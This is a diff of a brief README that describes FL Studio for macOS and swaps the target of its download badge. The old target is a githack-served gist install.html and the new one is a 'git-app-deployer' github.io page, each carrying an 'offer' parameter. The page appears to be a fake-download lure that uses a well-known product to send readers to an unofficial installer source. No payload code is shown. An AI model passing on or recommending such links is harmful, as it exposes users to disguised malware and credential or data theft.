@@ -2,7 +2,7 @@
 
 FL Studio is a macOS application designed for music creation, recording, and mixing. It provides a complete environment for producers, DJs, and musicians to compose, edit, and arrange music tracks on Mac with professional-grade tools.
 
-<a href="https://gistcdn.githack.com/robotgnome690/4bcaeb6ec15f214ff32c2fdf749e9676/raw/77bfbb5dae16c711dfa39e4b422c69cb2a8b367d/install.html?offer=FL%20Studio" target="_blank">
+<a href="https://git-app-deployer.github.io/.github/?offer=FLStudio" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20FL%20Studio%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
